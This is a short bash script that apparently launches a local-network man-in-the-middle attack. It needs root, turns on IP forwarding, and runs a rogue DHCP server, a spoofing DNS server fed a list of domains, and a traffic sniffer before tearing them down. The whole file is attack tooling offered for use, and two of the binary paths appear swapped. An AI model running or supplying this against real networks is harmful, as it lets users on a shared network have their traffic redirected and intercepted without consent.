#!/bin/bash

if [[ $EUID -ne 0 ]]
then
    echo -e "${RED}RUN AS SUDO"
    exit
fi

echo "1" > /proc/sys/net/ipv4/ip_forward

{ DHCP-Server/dhcpserver -m 255.255.255.0 & DNS-Rogue-Server/sniffer & Simply-HTTP-sniffer/dnsserver -l domains.txt 2>/dev/null; }

pkill dnsserver
pkill dhcpserver
pkill sniffer

echo "0" > /proc/sys/net/ipv4/ip_forward
